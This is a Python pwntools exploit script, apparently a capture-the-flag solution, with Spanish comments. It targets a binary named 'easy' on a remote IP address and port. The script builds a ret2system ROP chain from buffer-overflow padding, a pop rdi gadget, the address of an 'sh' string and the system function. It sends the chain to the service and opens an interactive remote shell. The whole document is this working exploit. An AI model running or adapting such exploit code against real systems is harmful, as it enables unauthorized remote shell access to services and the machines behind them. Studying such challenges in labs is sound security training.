from pwn import *

r = remote("208.68.39.19", 4426)
e = ELF('./easy')
#para debugear
#print "pidof ", util.proc.pidof(r)
#pause()
#el desafio consistia en hacer un ret 2 system
#el string /bin/sh no se encontraba presente, pero si el substrings "sh"
popret = 0x40125b #ropper
sh = 0x403037 #debugger find sh
system = e.symbols['system'] #magia de pwntools
print "pop rdi : ", hex(popret)
print "sh      : ", hex(sh)
print "system  : ", hex(system)
payload = ""
payload += "A" * cyclic_find('faab') #para encontrar el offset usando pwntools
payload += p64(popret)
payload += p64(sh)
payload += p64(system)

r.sendlineafter("quieres?", payload)
r.interactive()